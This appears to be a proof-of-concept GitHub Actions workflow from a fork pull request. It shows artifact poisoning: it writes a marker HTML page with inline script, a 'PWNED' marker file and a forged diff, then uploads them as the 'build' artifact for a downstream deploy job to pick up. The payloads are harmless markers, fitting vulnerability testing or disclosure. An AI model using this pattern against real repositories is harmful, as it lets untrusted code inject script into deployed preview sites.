name: Build
on:
  pull_request:

permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Attacker-controlled workflow (this file is part of the fork PR diff)
        run: |
          mkdir -p storybook-static tokens/css
          printf '<html><body><h1>PWNED-BY-FORK-PR</h1><script>document.title="attacker js on preview origin"</script></body></html>\n' > storybook-static/index.html
          echo "ATTACKER_MARKER_LEO_DEPLOY" > storybook-static/PWNED.txt
          echo "- attacker injected diff" > tokens/css/file-sizes.diff
      - uses: actions/upload-artifact@v4
        with:
          name: build
          if-no-files-found: error
          path: |
            ./storybook-static
            ./tokens/css/*.diff
